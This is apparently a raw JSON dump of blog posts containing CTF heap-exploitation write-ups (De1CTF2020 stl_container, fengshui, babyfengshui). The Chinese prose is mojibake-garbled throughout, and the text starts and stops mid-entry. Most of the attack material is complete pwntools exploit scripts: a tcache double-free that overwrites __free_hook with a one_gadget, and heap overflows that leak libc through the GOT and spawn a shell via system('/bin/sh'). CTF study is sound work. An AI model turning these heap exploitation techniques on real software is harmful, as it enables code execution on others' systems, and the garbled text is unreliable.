å‚è€ƒ\n\n[Linux é—¯å…³æ¸¸æˆä¹‹é€šå…³ç§˜ç±](https://mp.weixin.qq.com/s/7N--mAlG2o4ixfpHyUAc_A)\n\n[Wargames](https://xuanxuanblingbling.github.io/ctf/game/2020/02/04/Wargames/)","tags":["game"],"categories":["åŸºç¡€æŠ€èƒ½"]},{"title":"De1CTF2020ä¹‹stl_container","url":"/2020/05/03/stl-container/","content":"\n[stl_container](stl_container)\n[libc-2.27.so](libc-2.27.so)\n\n# 1 è§¦å‘å¼‚å¸¸åˆ†æ”¯\n\nè¿™ä¸ªé¢˜ç›®å¯»æ‰¾æ¼æ´ç‚¹çš„è¿‡ç¨‹æ¯”è¾ƒæ›²æŠ˜ï¼ŒIDAæ‰“å¼€å‘ç°æ˜¯c++ä»£ç ï¼Œä½†æ˜¯æˆ‘çœŸçš„ä¸æ‡‚C++ï¼Œçº ç»“ä»ä»£ç é‡Œæ‰¾æ¼æ´æ‰¾äº†ä¸€å¤©ä¹Ÿæ²¡æ€è·¯ã€‚åœ¨ç”·ç¥¨çš„æé†’ä¸‹ï¼Œç›´æ¥è§¦å‘æ¼æ´ï¼Œå†æ ¹æ®è§¦å‘çš„æ¼æ´å»ç†è§£ç¨‹åºç„¶ååˆ©ç”¨ã€‚\n\nmainå‡½æ•°ä¸­å¯ä»¥çœ‹åˆ°å››ä¸ªstlå‡½æ•°ã€‚listå’Œvectorå‡½æ•°ä¸­å®ç°äº†add,deleteå’Œshowã€‚queueå’Œstackä¸­åªæ”¯æŒaddå’Œdeleteã€‚\n\n```c\n \t  case 1u:\n        TestList();\n        break;\n      case 2u:\n        TestVector();\n        break;\n      case 3u:\n        TestQueue();\n        break;\n      case 4u:\n        TestStack();\n        break;\n```\n\nç”±äºæ˜¯å †ç›¸å…³çš„é¢˜ç›®ï¼Œå¾ˆè‡ªç„¶æƒ³åˆ°é—®é¢˜å¤§å¤šå‡ºåœ¨freeæ—¶ï¼Œå› æ­¤å¯¹listå’Œvectorä¸‹çš„addå’Œdeleteè¿›è¡Œæµ‹è¯•ã€‚åœ¨addä¸¤ä¸ªvectorï¼Œåˆ é™¤indexä¸º0çš„vectorï¼Œç„¶åæ‰§è¡Œshowï¼ˆ0ï¼‰æ—¶ï¼Œæ‰“å°äº†ä¸€å †æ— æ³•æ˜¾ç¤ºçš„å­—ç¬¦ã€‚\n\n```shell\nSTL Container Test\n1. list\n2. vector\n3. queue\n4. stack\n5. exit\n>> 2\n1. add\n2. delete\n3. show\n>> 1\ninput data:123\ndone!\nSTL Container Test\nâ€¦â€¦\n>> 2\n1. add\n2. delete\n3. show\n>> 1\ninput data:qwe\ndone!\nSTL Container Test\nâ€¦â€¦\n>> 2\n1. add\n2. delete\n3. show\n>> 2\nindex?\n0\ndone!\nSTL Container Test\nâ€¦â€¦\n>> 2\n1. add\n2. delete\n3. show\n>> 3\nindex?\n0\ndata: ï¿½ï¿½ï¿½\u001f\u0014V\n```\n\ndataéƒ¨åˆ†åº”è¯¥æ˜¯è®¿é—®äº†éæ³•å†…å­˜ï¼Œé‚£ä¹ˆæ¥ä¸‹æ¥å°±ç”¨gefè¿›è¡Œè°ƒè¯•ï¼Œçœ‹çœ‹æ˜¯ä»€ä¹ˆåŸå› å¯¼è‡´äº†è®¿é—®éæ³•å†…å­˜ã€‚\n\n# 2 åˆ†æå¼‚å¸¸åŸå› \n\nç”³è¯·ä¸¤ä¸ªvectorï¼Œç„¶åæŸ¥çœ‹chunkçš„åˆ†å¸ƒæƒ…å†µï¼š\n\n```shell\n~~~~~~\nChunk(addr=0x560ff5676490, size=0x20, flags=PREV_INUSE)\n    [0x0000560ff5676490     50 65 67 f5 0f 56 00 00 f0 65 67 f5 0f 56 00 00    Peg..V...eg..V..]\n~~~~~~\nChunk(addr=0x560ff5676550, size=0xa0, flags=PREV_INUSE)\n    [0x0000560ff5676550     76 65 63 74 6f 72 31 31 31 0a 00 00 00 00 00 00    vector111.......]\nChunk(addr=0x560ff56765f0, size=0xa0, flags=PREV_INUSE)\n    [0x0000560ff56765f0     76 65 63 74 6f 72 32 32 32 0a 00 00 00 00 00 00    vector222.......]\nChunk(addr=0x560ff5676690, size=0xe980, flags=PREV_INUSE)  â†  top chunk\n-----------------------------------------------------------------------------------\ngefâ¤  x/10gx 0x560ff5676490\n0x560ff5676490:\t0x0000560ff5676550\t0x0000560ff56765f0\n0x560ff56764a0:\t0x0000000000000000\t0x00000000000000a1\n```\n\nå¯ä»¥çœ‹åˆ°0x560ff5676490å¤„ä¾æ¬¡å­˜æ”¾äº†vector(0) å’Œvector(1)çš„å­—ç¬¦ä¸²åœ°å€ã€‚æ¥ä¸‹æ¥åˆ é™¤vector(0)ï¼Œçœ‹çœ‹è¿™ä¸ªåœ°å€å¤„å’Œå­—ç¬¦ä¸²æœ‰ä»€ä¹ˆå˜åŒ–ï¼Œå¦‚ä¸‹ã€‚\n\n```shell\n~~~~~~~~\nChunk(addr=0x560ff5676490, size=0x20, flags=PREV_INUSE)\n    [0x0000560ff5676490     f0 65 67 f5 0f 56 00 00 f0 65 67 f5 0f 56 00 00    .eg..V...eg..V..]\n~~~~~~~~\nChunk(addr=0x560ff5676550, size=0xa0, flags=PREV_INUSE)\n    [0x0000560ff5676550     76 65 63 74 6f 72 31 31 31 0a 00 00 00 00 00 00    vector111.......]\nChunk(addr=0x560ff56765f0, size=0xa0, flags=PREV_INUSE)\n    [0x0000560ff56765f0     b0 64 67 f5 0f 56 00 00 32 0a 00 00 00 00 00 00    .dg..V..2.......]\n--------------------------------------------------------------------------------\ngefâ¤  x/10gx 0x560ff5676490\n0x560ff5676490:\t0x0000560ff56765f0\t0x0000560ff56765f0\n0x560ff56764a0:\t0x0000000000000000\t0x00000000000000a1\n```\n\nå¯ä»¥çœ‹åˆ°0x560ff5676490å¤„ï¼ŒåŸæœ¬æ”¾vector(0)å­—ç¬¦ä¸²åœ°å€çš„ä½ç½®è¢«vector(1)å­—ç¬¦ä¸²åœ°å€`0x0000560ff56765f0`è¦†ç›–äº†ï¼Œè€Œä¸”vector(1)å­—ç¬¦ä¸²åœ°å€å¤„çš„ç©ºé—´è¢«é‡Šæ”¾äº†ï¼Œvector(0)çš„å­—ç¬¦ä¸²`â€œvector111â€`ä¾ç„¶åœ¨å †ä¸­ã€‚\n\næ‰§è¡Œshow(0)æ—¶ï¼Œè¿”å›å¦‚ä¸‹ä¿¡æ¯ï¼š\n\n```shell\n[DEBUG] Received 0x4f bytes:\n    00000000  64 61 74 61  3a 20 b0 64  67 f5 0f 56  0a 53 54 4c  â”‚dataâ”‚: Â·dâ”‚gÂ·Â·Vâ”‚Â·STLâ”‚\n    00000010  20 43 6f 6e  74 61 69 6e  65 72 20 54  65 73 74 0a  â”‚ Conâ”‚tainâ”‚er Tâ”‚estÂ·â”‚\n    00000020  31 2e 20 6c  69 73 74 0a  32 2e 20 76  65 63 74 6f  â”‚1. lâ”‚istÂ·â”‚2. vâ”‚ectoâ”‚\n    00000030  72 0a 33 2e  20 71 75 65  75 65 0a 34  2e 20 73 74  â”‚rÂ·3.â”‚ queâ”‚ueÂ·4â”‚. stâ”‚\n    00000040  61 63 6b 0a  35 2e 20 65  78 69 74 0a  3e 3e 20     â”‚ackÂ·â”‚5. eâ”‚xitÂ·â”‚>> â”‚\n    0000004f\ndata: \\xb0dgï¿½V\n```\n\næ ¹æ®æ¥æ”¶åˆ°çš„dataå¯ä»¥çœ‹å‡ºï¼Œæ‰“å°çš„æ˜¯`b0 64  67 f5 0f 56`ï¼Œè¿™ä¸ªæ­£å¥½å¯¹ä¸Šäº†æ­¤æ—¶åœ°å€0x560ff56765f0å¤„çš„å†…å®¹ã€‚\n\n- åˆ†æåˆ°è¿™é‡Œï¼Œå¯ä»¥çœ‹å‡ºæˆ‘ä»¬åœ¨delete 0å·vectoræ—¶ï¼Œå®é™…å‘ç”Ÿäº†è¿™ä¹ˆä¸€ä¸ªè¿‡ç¨‹ï¼š0å·vectorçš„å­—ç¬¦ä¸²åœ°å€è¢«ä»0x560ff5676490ç©ºé—´ä¸­åˆ é™¤ï¼Œå¹¶ä¸”å°†1å·vectorçš„å­—ç¬¦ä¸²åœ°å€å‰ç§»ä¸€ä½ï¼›ç„¶åå†free 0å·vectorçš„å­—ç¬¦ä¸²åœ°å€ï¼Œä½†æ­¤æ—¶è¯¥å¤„å·²ç»å˜æˆ 1å·vectorçš„å­—ç¬¦ä¸²åœ°å€ï¼›å› æ­¤å¯¼è‡´åˆ é™¤ 0å·vectorå´freeäº† 1å·vectorçš„å­—ç¬¦ä¸²åœ°å€ã€‚è€Œ1å·vectorçš„å­—ç¬¦ä¸²åœ°å€åç»­è¿˜å¯ä»¥ç»§ç»­è¢«ä½¿ç”¨ï¼Œè¿™å°±æ˜¯ä¸€ä¸ªæ‚¬ç©ºæŒ‡é’ˆã€‚\n\n# 3 æ‚¬ç©ºæŒ‡é’ˆå¯ä»¥åšä»€ä¹ˆ\n\nè¿™ä¸ªæ‚¬ç©ºæŒ‡é’ˆç›®å‰æœ‰ä¸¤ç§æ“ä½œï¼š\n\n- delete() - double freeã€‚ç”±äºè¿™ä¸ªé¢˜æ˜¯ubuntu18.04ä¸‹libc-2.27.soï¼Œæœ‰Tcacheï¼Œå› æ­¤ä¸€æ¬¡double freeå°±å¯ä»¥å½¢æˆä¸€ä¸ªç¯ï¼Œè¿›è€Œä»»æ„åœ°å€å†™ã€‚å¯ä»¥å‚è€ƒæˆ‘ä¹‹å‰åšè¿‡çš„ä¸€ä¸ªé“¾æ¥ï¼šhttps://blingblingxuanxuan.github.io/2020/03/13/TcacheTear/\n- show() - æ³„éœ²ä¿¡æ¯ã€‚å¦‚libcã€å †æ ˆã€ç¨‹åºç­‰åœ°å€æˆ–ä¿¡æ¯ã€‚\n\n## 3.1 æ³„éœ²libc\n\né€šå¸¸çš„åšæ³•æ˜¯å°†ä¸€ä¸ªchunk freeåˆ°unsorted binä¸­ï¼Œå†å°†è¿™ä¸ªchunkç”³è¯·å›æ¥ï¼Œç„¶åæ‰“å°è¯¥chunkå†…å®¹ï¼Œå°±å¯ä»¥è®¡ç®—å‡ºlibcçš„åœ°å€ã€‚\n\nè¿™é“é¢˜ä¸­æˆ‘ä»¬æ— æ³•æ§åˆ¶ç”³è¯·çš„å †ç©ºé—´çš„å¤§å°ï¼Œä½†æ˜¯æ¯addä¸€ä¸ªlist/vector/queue/stackæ—¶ï¼Œåœ¨Test::Initä¸­éƒ½æœ‰malloc(0x98)ï¼Œè¿™äº›chunkåœ¨ç›¸åº”çš„deleteæ“ä½œåéƒ½ä¼šä¸²åˆ°å¤§å°ä¸º0xa0çš„Tcacheé“¾ä¸Šã€‚ä¸€æ¡Tcacheé“¾æœ€å¤šä¸²7ä¸ªchunkï¼Œç¬¬8ä¸ªç›¸åŒå¤§å°çš„chunkä¼šè¢«æ”¾åˆ°unsorted binä¸­ã€‚\n\næ„é€ å¦‚ä¸‹é¡ºåºçš„addå’Œdeleteã€‚æœ€å…ˆdelete list(1)æ—¶ï¼Œå¤§å°ä¸º0xa0çš„Tcacheé“¾ä¸Šä¼šå­˜åœ¨ä¸€ä¸ªä¹‹å‰çš„chunkï¼Œæ­¤æ—¶æˆ‘ä»¬åªéœ€delete 6ä¸ªå°±å¯ä»¥å°†vector(0)æ”¾åˆ°unsorted binä¸­ï¼ˆå®é™…æ˜¯å°†vector(1)çš„dataå—æ‰”åˆ°äº†unsorted binï¼‰ï¼Œæ¥ä¸‹æ¥é€šè¿‡show(vector 0)å°±å¯ä»¥è¯»å–åˆ°leakçš„åœ°å€ï¼Œä»è€Œå¾—åˆ°malloc_stateç»“æ„ä½“åœ°å€ï¼Œæœ€åæŸ¥æ‰¾libc-2.27.soä¸­malloc_trim()ä¸­malloc_stateçš„åç§»ï¼Œå°±å¯ä»¥è®¡ç®—å‡ºlibcåœ°å€ã€‚\n\n```python\nvector_add(\"vector111\")\nvector_add(\"vector222\")\nlist_add(\"list111\")\nlist_add(\"list222\")\nqueue_add(\"queue111\")\nqueue_add(\"queue222\")\nstack_add(\"stack111\")\nstack_add(\"stack222\")\n\nlist_delete(1)\nlist_delete(0)\nqueue_delete()\nqueue_delete()\nstack_delete()\nstack_delete()\nvector_delete(0)\n\nvector_show(0)\nleak_addr = u64(myproc.recvuntil(\"\\n\")[:-1].ljust(8,\"\\x00\"))\nstate_addr = leak_addr - 0x60\nlibc_addr = state_addr - 0x3EBC40\nlog.warn(\"libc_addr: 0x%x\" % libc_addr)\n```\n\n## 3.2 å†™libcçš„å‡½æ•°æŒ‡é’ˆ\n\nç”±äºæœ¬é¢˜gotè¡¨ä¸å¯å†™ï¼Œä¸”å¼€å¯äº†PIEã€‚å› æ­¤è€ƒè™‘å†™libcä¸­çš„å‡½æ•°æŒ‡é’ˆï¼Œå¦‚`__malloc_hook`å’Œ`__free_hook`ï¼Œå°†å‡½æ•°æŒ‡é’ˆå†™æˆone gadgetåœ°å€ï¼Œä¸‹æ¬¡è°ƒç”¨åˆ°mallocæˆ–freeæ—¶å°±èƒ½get shellã€‚\n\næ³„éœ²å®Œlibcåï¼Œéœ€è¦è°ƒæ•´ä¸‹å †ç©ºé—´çš„å¸ƒå±€ï¼Œé€šè¿‡double freeè·å–ä¸€ä¸ªç¯ï¼ˆåœ¨Tcacheé“¾ä¸Šï¼‰ï¼Œä»è€Œå»ä»»æ„åœ°å€å†™ã€‚\n\nç”±äºæ­¤æ—¶Tcacheä¸Š0xa0é“¾ä¸Šæ˜¯æ»¡çš„ï¼Œå› æ­¤éœ€è¦addæ“ä½œå°†Tcacheé“¾ä¸Šçš„chunkç”¨æ‰ä¸€äº›ã€‚æˆ‘è¿™é‡Œaddäº†ä¸‰æ¬¡ï¼Œå…¶ä¸­ä¸€æ¬¡å¿…é¡»æ˜¯add vector(å‡‘é½ä¸¤ä¸ªvector)ï¼Œä¸ç„¶åç»­æ— æ³•delete ä¸¤æ¬¡å½¢æˆdouble freeã€‚\n\n```\none_gadget1 = libc_addr + 0x4f322\nfree_hook_addr = libc_addr + 0x3ed8e8\n\nvector_add(\"vector333\")\nlist_add(\"list333\")\nlist_add(\"list444\")\nvector_delete(0)\nvector_delete(0)\n\nvector_add(p64(free_hook_addr))\nvector_add(p64(one_gadget1))\n```\n\nåœ¨libc-2.27.soä¸­æ‰¾åˆ°ä¸‰ä¸ªå¯ç”¨gadgetï¼Œå…¶ä¸­0x4f322å¯åˆ©ç”¨æˆåŠŸï¼š\n\n```shell\nbling@Ubuntu1804:/mnt/hgfs/vmshare-1804$ one_gadget libc-2.27.so \n0x4f2c5 execve(\"/bin/sh\", rsp+0x40, environ)\nconstraints:\n  rsp & 0xf == 0\n  rcx == NULL\n\n0x4f322 execve(\"/bin/sh\", rsp+0x40, environ)\nconstraints:\n  [rsp+0x40] == NULL\n\n0x10a38c execve(\"/bin/sh\", rsp+0x70, environ)\nconstraints:\n  [rsp+0x70] == NULL\n```\n\n# 2 EXP\n\n```python\n#coding=utf-8\nfrom pwn import *\n\ncontext(arch=\"amd64\",os=\"linux\",log_level=\"debug\")\nmyelf = ELF(\"./stl_container\")\nmylibc = ELF(\"./libc-2.27.so\")\nmyproc = process(myelf.path)\n\ndef list_add(data):\n    myproc.recvuntil(\">> \")\n    myproc.sendline(str(1))\n    myproc.recvuntil(\">> \")\n    myproc.sendline(str(1))\n    myproc.recvuntil(\"input data:\")\n    myproc.sendline(data)\n\ndef list_delete(index):\n    myproc.recvuntil(\">> \")\n    myproc.sendline(str(1))\n    myproc.recvuntil(\">> \")\n    myproc.sendline(str(2))\n    myproc.recvuntil(\"index?\")\n    myproc.sendline(str(index))\n\ndef list_show(index):\n    myproc.recvuntil(\">> \")\n    myproc.sendline(str(1))\n    myproc.recvuntil(\">> \")\n    myproc.sendline(str(3))\n    myproc.recvuntil(\"index?\")\n    myproc.sendline(str(index))\n\ndef vector_add(data):\n    myproc.recvuntil(\">> \")\n    myproc.sendline(str(2))\n    myproc.recvuntil(\">> \")\n    myproc.sendline(str(1))\n    myproc.recvuntil(\"input data:\")\n    myproc.sendline(data)\n\ndef vector_delete(index):\n    myproc.recvuntil(\">> \")\n    myproc.sendline(str(2))\n    myproc.recvuntil(\">> \")\n    myproc.sendline(str(2))\n    myproc.recvuntil(\"index?\")\n    myproc.sendline(str(index))\n\ndef vector_show(index):\n    myproc.recvuntil(\">> \")\n    myproc.sendline(str(2))\n    myproc.recvuntil(\">> \")\n    myproc.sendline(str(3))\n    myproc.recvuntil(\"index?\")\n    myproc.sendline(str(index))\n\ndef queue_add(data):\n    myproc.recvuntil(\">> \")\n    myproc.sendline(str(3))\n    myproc.recvuntil(\">> \")\n    myproc.sendline(str(1))\n    myproc.recvuntil(\"input data:\")\n    myproc.sendline(data)\n\ndef queue_delete():\n    myproc.recvuntil(\">> \")\n    myproc.sendline(str(3))\n    myproc.recvuntil(\">> \")\n    myproc.sendline(str(2))\n\ndef stack_add(data):\n    myproc.recvuntil(\">> \")\n    myproc.sendline(str(4))\n    myproc.recvuntil(\">> \")\n    myproc.sendline(str(1))\n    myproc.recvuntil(\"input data:\")\n    myproc.sendline(data)\n\ndef stack_delete():\n    myproc.recvuntil(\">> \")\n    myproc.sendline(str(4))\n    myproc.recvuntil(\">> \")\n    myproc.sendline(str(2))\n\n###leak libc###\nvector_add(\"vector111\")\nvector_add(\"vector222\")\nlist_add(\"list111\")\nlist_add(\"list222\")\nqueue_add(\"queue111\")\nqueue_add(\"queue222\")\nstack_add(\"stack111\")\nstack_add(\"stack222\")\n\nlist_delete(1)\nlist_delete(0)\nqueue_delete()\nqueue_delete()\nstack_delete()\nstack_delete()\nvector_delete(0)\n\nvector_show(0)\nmyproc.recvuntil(\"data: \")\nleak_addr = u64(myproc.recvuntil(\"\\n\")[:-1].ljust(8,\"\\x00\"))\nlog.warn(\"leak_addr: 0x%x\" % leak_addr)\n\nstate_addr = leak_addr - 0x60\nlibc_addr = state_addr - 0x3EBC40\nlog.warn(\"libc_addr: 0x%x\" % libc_addr)\n\n### change libc hook###\none_gadget0 = libc_addr + 0x4f2c5\none_gadget1 = libc_addr + 0x4f322\none_gadget2 = libc_addr + 0x10a38c\nmalloc_hook_addr = libc_addr + 0x3ebc30\nfree_hook_addr = libc_addr + 0x3ed8e8\n#free_hook_addr = libc_addr + mylibc.symbols['__free_hook']\nlog.warn(\"malloc_hook_addr: 0x%x\" % malloc_hook_addr)\nlog.warn(\"free_hook_addr: 0x%x\" % free_hook_addr)\nlog.warn(\"one_gadget0: 0x%x\" % one_gadget0)\nlog.warn(\"one_gadget1: 0x%x\" % one_gadget1)\nlog.warn(\"one_gadget2: 0x%x\" % one_gadget2)\n\nvector_add(\"vector333\")\nlist_add(\"list333\")\nlist_add(\"list444\")\nvector_delete(0)\nvector_delete(0)\n\nvector_add(p64(free_hook_addr))\nvector_add(p64(one_gadget1))\n\n#gdb.attach(myproc)\nmyproc.interactive()\n```\n\n\n\n","categories":["CTF"]},{"title":"fengshui","url":"/2020/04/25/fengshui/","content":"\n- é¢˜ç›®æ–‡ä»¶ï¼š\n\n# 1 åˆ†æ\n\n## 1.1 ç¨‹åºåŸºæœ¬ä¿¡æ¯\n\né¦–å…ˆæŸ¥çœ‹äºŒè¿›åˆ¶æ–‡ä»¶ä¿¡æ¯ï¼š\n\n```shell\n$ file fengshui\nfengshui: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/l, for GNU/Linux 2.6.24, BuildID[sha1]=45b09ec28a895f08b53682ead4e084874ee4b466, stripped\n$ checksec fengshui\n[*] '/mnt/hgfs/vmshare-1604/fengshui/ida/fengshui'\n    Arch:     amd64-64-little\n    RELRO:    Partial RELRO\n    Stack:    Canary found\n    NX:       NX enabled\n    PIE:      No PIE (0x400000)\n```\n\n## 1.2 IDAæºç åˆ†æ\n\nç¨‹åºæœ‰4ä¸ªåŠŸèƒ½ï¼šæ·»åŠ personï¼Œåˆ é™¤personï¼Œä¿®æ”¹personåå­—ï¼Œæ‰“å°personä¿¡æ¯ã€‚\n\n### 1.2.1 æ·»åŠ person\n\n![](fengshui-1.png)\n\n\n\n### 1.2.2 åˆ é™¤person\n\n\n\n\n\n### 1.2.3 ä¿®æ”¹personåå­—\n\n\n\n\n\n### 1.2.4 æ‰“å°personä¿¡æ¯\n\n\n\n\n\n# 2 åˆ©ç”¨æ€è·¯\n\n![](fengshui-2.png)\n\n\n\n![](fengshui-3.png)\n\n\n\n# 3 exp\n\n## ä½¿ç”¨one_gadgetçš„æ–¹å¼è·å–shell\n\næœç´¢libcä¸­çš„å¯ç”¨gadgetï¼ŒæŒ¨ä¸ªè¯•è¯•ï¼Œæœ€åä¸€ä¸ªåœ¨æˆ‘çš„æœºå™¨ä¸Šå¯ä»¥æˆåŠŸã€‚\n\n```shell\nbling@bling:~$ one_gadget libc-2.23.so \n0x45216 execve(\"/bin/sh\", rsp+0x30, environ)\nconstraints:\n  rax == NULL\n\n0x4526a execve(\"/bin/sh\", rsp+0x30, environ)\nconstraints:\n  [rsp+0x30] == NULL\n\n0xf02a4 execve(\"/bin/sh\", rsp+0x50, environ)\nconstraints:\n  [rsp+0x50] == NULL\n\n0xf1147 execve(\"/bin/sh\", rsp+0x70, environ)\nconstraints:\n  [rsp+0x70] == NULL\n\n```\n\n- expå¦‚ä¸‹\n\n```python\n#coding=utf-8\nfrom pwn import *\ncontext(arch = \"amd64\",os = \"linux\",log_level = \"debug\")\n\nmyelf = ELF(\"./fengshui\")\nmyproc = process(myelf.path)\n\ndef add(name_len,name,school_len,school,yes_no):\n    myproc.recvuntil(\"option:\")\n    myproc.sendline(str(1))\n    myproc.recvuntil(\"please input the length of name\")\n    myproc.sendline(str(name_len))\n    myproc.recvuntil(\"please input name\")\n    myproc.sendline(name)\n    myproc.recvuntil(\"please input the length of schoolname\")\n    myproc.sendline(str(school_len))\n    myproc.recvuntil(\"please input the school name\")\n    myproc.sendline(school)\n    myproc.recvuntil(\"is a tutor?(yes/no)\")\n    myproc.sendline(yes_no)\n\ndef delete(id):\n    myproc.recvuntil(\"option:\")\n    myproc.sendline(str(2))\n    myproc.recvuntil(\"input a id to delete\")\n    myproc.sendline(str(id))\n\ndef edit(id,option,len,name):\n    myproc.recvuntil(\"option:\")\n    myproc.sendline(str(3))\n    myproc.recvuntil(\"input a id to edit\")\n    myproc.sendline(str(id))\n    myproc.recvuntil(\"option:\")\n    myproc.sendline(str(option))\n    myproc.recvuntil(\"please input the length of new name\")\n    myproc.sendline(str(len))\n    myproc.recvuntil(\"please input new name\")\n    myproc.sendline(name)\n\n\ndef sayhello(id):\n    myproc.recvuntil(\"option:\")\n    myproc.sendline(str(4))\n    myproc.recvuntil(\"input a id to sayhello\")\n    myproc.sendline(str(id))\n\nfor i in range(10):\n    add(0x10,\"xiayuan\",20,\"NUDT\",\"yes\")\n    add(0x20,\"xiayuan\",20,\"NUDT\",\"yes\")\n    add(0x30,\"xiayuan\",20,\"NUDT\",\"yes\")\n    add(0x40,\"xiayuan\",20,\"NUDT\",\"yes\")\n    add(0x50,\"xiayuan\",20,\"NUDT\",\"yes\")\n    add(0x60,\"xiayuan\",20,\"NUDT\",\"yes\")\n    add(0x70,\"xiayuan\",20,\"NUDT\",\"yes\")\n\nadd(0x10,\"xiayuan70\",20,\"NUDT70\",\"yes\")\nadd(0x10,\"xiayuan71\",20,\"NUDT71\",\"yes\")\nadd(0x10,\"xiayuan72\",20,\"NUDT72\",\"yes\")\nadd(0x10,\"xiayuan73\",20,\"NUDT73\",\"yes\")\n\npayload = \"a\" * 0x40 + p64(71) + p64(myelf.got[\"puts\"]) + p64(0x400760) + p64(0) \n#payload = \"a\" * 0x40 + p64(71) + p64(0xdeadbeef) + p64(0xdeadbeef) + p64(0) #+ p64(0)\nedit(70,1,990,payload)\nsayhello(71)\nmyproc.recv()\nputs_addr = u64(myproc.recvuntil(\"\\n\")[:-1].ljust(8,\"\\x00\"))\nlog.warn(\"put addr: 0x%x\" % puts_addr)\n\nlibc_base = puts_addr - 0x6F690\nsh_gadget = libc_base + 0xf1147\nlog.warn(\"libc base: 0x%x\" % libc_base)\nlog.warn(\"gadget addr: 0x%x\" % sh_gadget)\n\npayload = \"a\" * 0x40 + p64(73) + p64(0) + p64(sh_gadget) + p64(0) \nedit(72,1,990,payload)\nsayhello(73)\n\n#gdb.attach(myproc)\nmyproc.interactive()\n```\n\n## ä½¿ç”¨systemå‡½æ•°è·å–shell\n\n```python\n#coding=utf-8\nfrom pwn import *\ncontext(arch = \"amd64\",os = \"linux\",log_level = \"debug\")\n\nmyelf = ELF(\"./fengshui\")\nmylibc = ELF(\"./libc-2.23.so\")\nmyproc = process(myelf.path)\n\ndef add(name_len,name,school_len,school,yes_no):\n    myproc.recvuntil(\"option:\")\n    myproc.sendline(str(1))\n    myproc.recvuntil(\"please input the length of name\")\n    myproc.sendline(str(name_len))\n    myproc.recvuntil(\"please input name\")\n    myproc.sendline(name)\n    myproc.recvuntil(\"please input the length of schoolname\")\n    myproc.sendline(str(school_len))\n    myproc.recvuntil(\"please input the school name\")\n    myproc.sendline(school)\n    myproc.recvuntil(\"is a tutor?(yes/no)\")\n    myproc.sendline(yes_no)\n\ndef delete(id):\n    myproc.recvuntil(\"option:\")\n    myproc.sendline(str(2))\n    myproc.recvuntil(\"input a id to delete\")\n    myproc.sendline(str(id))\n\ndef edit(id,option,len,name):\n    myproc.recvuntil(\"option:\")\n    myproc.sendline(str(3))\n    myproc.recvuntil(\"input a id to edit\")\n    myproc.sendline(str(id))\n    myproc.recvuntil(\"option:\")\n    myproc.sendline(str(option))\n    myproc.recvuntil(\"please input the length of new name\")\n    myproc.sendline(str(len))\n    myproc.recvuntil(\"please input new name\")\n    myproc.sendline(name)\n\n\ndef sayhello(id):\n    myproc.recvuntil(\"option:\")\n    myproc.sendline(str(4))\n    myproc.recvuntil(\"input a id to sayhello\")\n    myproc.sendline(str(id))\n\nfor i in range(10):\n    add(0x10,\"xiayuan\",20,\"NUDT\",\"yes\")\n    add(0x20,\"xiayuan\",20,\"NUDT\",\"yes\")\n    add(0x30,\"xiayuan\",20,\"NUDT\",\"yes\")\n    add(0x40,\"xiayuan\",20,\"NUDT\",\"yes\")\n    add(0x50,\"xiayuan\",20,\"NUDT\",\"yes\")\n    add(0x60,\"xiayuan\",20,\"NUDT\",\"yes\")\n    add(0x70,\"xiayuan\",20,\"NUDT\",\"yes\")\n\nadd(0x10,\"xiayuan70\",20,\"NUDT70\",\"yes\")\nadd(0x10,\"xiayuan71\",20,\"NUDT71\",\"yes\")\nadd(0x10,\"xiayuan72\",20,\"NUDT72\",\"yes\")\nadd(0x10,\"xiayuan73\",20,\"NUDT73\",\"yes\")\n\npayload = \"a\" * 0x40 + p64(71) + p64(myelf.got[\"puts\"]) + p64(0x400760) + p64(0) \n#payload = \"a\" * 0x40 + p64(71) + p64(0xdeadbeef) + p64(0xdeadbeef) + p64(0) #+ p64(0)\nedit(70,1,990,payload)\nsayhello(71)\nmyproc.recv()\nputs_addr = u64(myproc.recvuntil(\"\\n\")[:-1].ljust(8,\"\\x00\"))\nlog.warn(\"put addr: 0x%x\" % puts_addr)\n\nlibc_base = puts_addr - 0x6F690\nsystem_addr = libc_base + 0x45390\nsh_addr = libc_base + next(mylibc.search(\"/bin/sh\\x00\"))\nlog.warn(\"libc base: 0x%x\" % libc_base)\nlog.warn(\"system addr: 0x%x\" % system_addr)\nlog.warn(\"sh addr: 0x%x\" % sh_addr)\n\npayload = \"a\" * 0x40 + p64(73) + p64(sh_addr) + p64(system_addr) + p64(0) \nedit(72,1,990,payload)\nsayhello(73)\n\n#gdb.attach(myproc)\nmyproc.interactive()\n```\n\n","categories":["CTF"]},{"title":"babyfengshui","url":"/2020/04/19/babyfengshui/","content":"\n# 1 åˆ†æ\n\n## 1.1 äºŒè¿›åˆ¶ç¨‹åºåŸºæœ¬ä¿¡æ¯\n\n```shell\n$ file babyfengshui \nbabyfengshui: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-, for GNU/Linux 2.6.32, BuildID[sha1]=cecdaee24200fe5bbd3d34b30404961ca49067c6, stripped\n\n$ checksec babyfengshui \n[*] '/mnt/hgfs/vmshare-1604/babyfengshui/babyfengshui'\n    Arch:     i386-32-little\n    RELRO:    Partial RELRO\n    Stack:    Canary found\n    NX:       NX enabled\n    PIE:      No PIE (0x8048000)\n\n```\n\n## 1.2 IDAåˆ†ææºç æµç¨‹\n\nç¨‹åºä¸»è¦æœ‰å››ä¸ªå‡½æ•°ï¼šæ·»åŠ ç”¨æˆ·ï¼Œåˆ é™¤ç”¨æˆ·ï¼Œå±•ç¤ºç”¨æˆ·ä¿¡æ¯ï¼Œå‡çº§ç”¨æˆ·ä¿¡æ¯ã€‚\n\n### æ·»åŠ ç”¨æˆ·\n\n```c\nÂ·Â·Â·Â·\nprintf(\"size of description: \");\n__isoc99_scanf(\"%u%c\", &v2, &v0);\nadd_user(v2);\nÂ·Â·Â·Â·\n_DWORD *__cdecl add_user(size_t a1)\n{\n  void *s; // ST24_4\n  _DWORD *v2; // ST28_4\n\n  s = malloc(a1);\n  memset(s, 0, a1);\n  v2 = malloc(0x80u);\n  memset(v2, 0, 0x80u);\n  *v2 = s;\n  ptr[(unsigned __int8)user_num] = v2;\n  printf(\"name: \");\n  get_v1((char *)ptr[(unsigned __int8)user_num] + 4, 0x7C);\n  update_description(++user_num - 1);\n  return v2;\n}\n```\n\næ·»åŠ ç”¨æˆ·çš„ä»£ç 